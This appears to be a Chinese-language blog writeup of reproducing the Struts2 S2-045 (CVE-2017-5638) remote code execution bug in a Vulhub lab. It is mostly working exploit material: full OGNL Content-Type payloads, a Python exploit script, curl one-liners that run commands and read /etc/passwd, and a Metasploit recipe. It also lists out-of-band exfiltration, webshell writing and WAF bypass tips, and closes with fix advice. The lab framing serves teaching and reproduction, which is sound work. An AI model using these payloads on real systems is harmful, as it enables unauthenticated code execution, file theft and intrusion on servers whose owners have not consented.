---
title: Struts2 S2-045 漏洞复现 Writeup（CVE-2017-5638）
date: 2026-06-08 11:43:00
categories:
    - 漏洞复现
    - Struts2
    - CTF/靶场
tags: Struts2-045 漏洞
---

## 漏洞简介

**漏洞名称：** Apache Struts2 远程代码执行（S2-045）

**CVE 编号：** CVE-2017-5638

**影响版本：** Struts 2.3.5 ~ 2.3.31，Struts 2.5 ~ 2.5.10

**漏洞类型：** 远程代码执行（RCE）

**危害等级：** 严重（Critical）

**CVSS 评分：** 10.0

<!--more-->

2017年3月7日，Apache Struts2 爆出此漏洞，由于影响范围极广（大量企业生产环境使用 Struts2），被安全圈称为"核弹级"漏洞。Equifax 事件中，攻击者就是利用此漏洞窃取了 1.43 亿用户的个人信息。

## 漏洞原理

### 核心问题

Struts2 使用 Jakarta Multipart Parser 处理文件上传。当解析 HTTP 请求中的 `Content-Type` 时，如果值非法，会进入错误处理流程。在错误处理中，**OGNL 表达式引擎会对 `Content-Type` 的值进行二次解析**，导致攻击者注入的恶意表达式被执行。

### 攻击链

```
恶意 Content-Type → 解析失败 → 进入错误处理 → OGNL 引擎解析表达式 → 代码执行
```

### 正常 vs 恶意请求

**正常请求：**
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
```

**恶意请求：**
```
Content-Type: %{(#_='multipart/form-data')...(恶意OGNL表达式)}
```

## 环境搭建

### 靶场信息

- 靶场来源：Vulhub
- 靶场镜像：vulhub/struts2:2.3.30
- 容器端口：8080（映射到主机 9090）

### 启动命令

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045
docker compose up -d
```

访问 `http://127.0.0.1:9090` 即可看到 Struts2 上传页面。

## 漏洞复现

### 方法一：Burp Suite 手工利用

这是最基础也是最直观的方法，适合理解漏洞原理。

**第一步：配置代理**

- Burp Suite 代理监听：`127.0.0.1:8080`
- 浏览器设置 HTTP 代理：`127.0.0.1:8080`
- 访问 `http://127.0.0.1:9090` 抓取请求

![](./2026-06-09-10-57-54.png)

**第二步：验证漏洞存在**

拦截请求后，修改 `Content-Type` 为：

```
Content-Type: %{233*233}.multipart/form-data
```

![](./2026-06-09-11-00-29.png)

修改后将数据包放行，放行后需要找到对应的数据包发送到 Repeater 中

![](./2026-06-09-11-43-45.png)

在 Repeater 这里进行修改干净的请求和使用安全验证 payload：
这里建议可以改成一个干净的请求，这里我没有进行更改；

```bash
POST /doUpload.action HTTP/1.1
Host: 127.0.0.1:9090
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
Content-Type: PAYLOAD_HERE
Content-Length: 0
```

修改后直接使用安全验证 payload，把对应的 Content-Type 改成下面这个，它只输出标记和 `54289`，不执行系统命令：

```bash
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#w.println('S2-045-OK-54289')).(#w.flush())}
```

![](./2026-06-09-11-41-25.png)

修改后在 Repeater 进行 Send

![](./2026-06-09-11-49-22.png)

放包后查看响应，如果响应头中出现 `vulhub: 54289`（233×233=54289），说明 OGNL 表达式被执行，漏洞存在，也就是 `S2-045-OK-54289`

**第三步：执行系统命令**

修改 `Content-Type` 为以下 payload，执行 `id` 命令：

```
curl "http://target:8080/showcase/actionChain2.action" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

查看响应头中 `vulhub` 字段的值，即为命令执行结果。

---

### 方法二：Python 脚本自动化利用

适合批量验证或不想用 Burp 的场景。

**exploit.py：**

```python
import requests

target = "http://127.0.0.1:9090"

# OGNL 表达式：通过 Runtime.exec() 执行命令
payload = "%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
          "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
          "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
          "(#ognlUtil.getExcludedPackageNames().clear())." \
          "(#ognlUtil.getExcludedClasses().clear())." \
          "(#context.setMemberAccess(#dm))))." \
          "(#cmd='{command}')." \
          "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." \
          "(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/bash','-c',#cmd}}))." \
          "(#p=new java.lang.ProcessBuilder(#cmds))." \
          "(#p.redirectErrorStream(true)).(#process=#p.start())." \
          "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." \
          "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
          "(#ros.flush())}}"

headers = {
    "Content-Type": payload.replace("{command}", "id"),
    "User-Agent": "Mozilla/5.0"
}

r = requests.get(target, headers=headers)
print(r.text)
```

运行：

```bash
python exploit.py
```

输出类似：

```
uid=0(root) gid=0(root) groups=0(root)
```

---

### 方法三：cURL 命令行利用

最轻量的方式，一行命令搞定。

**验证漏洞：**

```bash
curl -H "Content-Type: %{233*233}.multipart/form-data" http://127.0.0.1:9090 -v 2>&1 | grep vulhub
```

如果返回 `vulhub: 54289`，漏洞存在。

**执行命令（id）：**

```bash
curl -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',(new freemarker.template.utility.Execute()).exec({'id'}))}.multipart/form-data" http://127.0.0.1:9090 -v 2>&1 | grep vulhub
```

**执行命令（whoami）：**

```bash
curl -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',(new freemarker.template.utility.Execute()).exec({'whoami'}))}.multipart/form-data" http://127.0.0.1:9090 -v 2>&1 | grep vulhub
```

**读取文件（/etc/passwd）：**

```bash
curl -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',(new freemarker.template.utility.Execute()).exec({'cat /etc/passwd'}))}.multipart/form-data" http://127.0.0.1:9090 -v 2>&1 | grep vulhub
```

---

### 方法四：使用 Metasploit 框架

适合红队场景，集成化利用。

```bash
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 127.0.0.1
set RPORT 9090
set TARGETURI /
exploit
```

成功后直接获得 Meterpreter session。

---

### 方法五：使用 Nuclei 批量扫描

适合批量资产验证。

```yaml
# s2-045.yaml
id: CVE-2017-5638
info:
  name: Struts2 S2-045 RCE
  severity: critical
  tags: struts,rce,cve2017

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: "%{233*233}.multipart/form-data"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "54289"
        part: header
```

```bash
nuclei -u http://target:9090 -t s2-045.yaml
```

---

### 方法六：使用 Struts2 漏洞扫描工具

推荐使用 GitHub 上的专用扫描工具，一键检测 + 利用：

**Struts2-Scan：**

```bash
git clone https://github.com/HatBoy/Struts2-Scan.git
cd Struts2-Scan
python Struts2Scan.py -u http://127.0.0.1:9090
```

工具会自动检测所有 S2 漏洞（S2-001 到 S2-057），并提供交互式命令执行。

## 漏洞利用技巧

### 回显问题

部分环境下 OGNL 执行结果无法直接回显到响应体，可以通过以下方式解决：

1. **写入响应头**（本文演示的方式）：`addHeader('key', result)`
2. **DNS 外带**：将命令结果通过 DNS 请求外带
3. **HTTP 外带**：curl 结果发送到攻击者服务器
4. **写 WebShell**：将结果写入服务器文件

### WAF 绕过

如果目标有 WAF，可以尝试以下绕过方式：

- **编码绕过**：对 OGNL 表达式进行 Unicode 编码
- **变形 payload**：利用 OGNL 语法特性构造等价表达式
- **分块传输**：使用 Transfer-Encoding: chunked 分块发送

## 修复建议

1. **升级 Struts2** — 升级至 2.3.32 或 2.5.10.1 以上版本
2. **切换上传组件** — 将 Jakarta Multipart Parser 替换为 Pell Multipart Plugin
3. **WAF 规则** — 在 WAF 中添加 Content-Type 异常检测规则
4. **删除上传功能** — 如果不需要文件上传，直接移除相关组件

## 总结

S2-045 是一个教科书级别的 RCE 漏洞：

- **攻击成本极低** — 一个 HTTP 请求，改一个 header
- **影响范围极广** — 所有使用默认配置的 Struts2 应用
- **利用方式多样** — Burp、脚本、命令行、扫描器均可
- **危害极大** — 无需认证直接 RCE

---

**参考资料：**
- [Apache Struts2 S2-045 官方公告](http://struts.apache.org/docs/s2-045.html)
- [Vulhub S2-045 靶场](https://github.com/vulhub/vulhub/tree/master/struts2/s2-045)
- [CVE-2017-5638 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [NSFOCUS S2-045 分析](https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/)
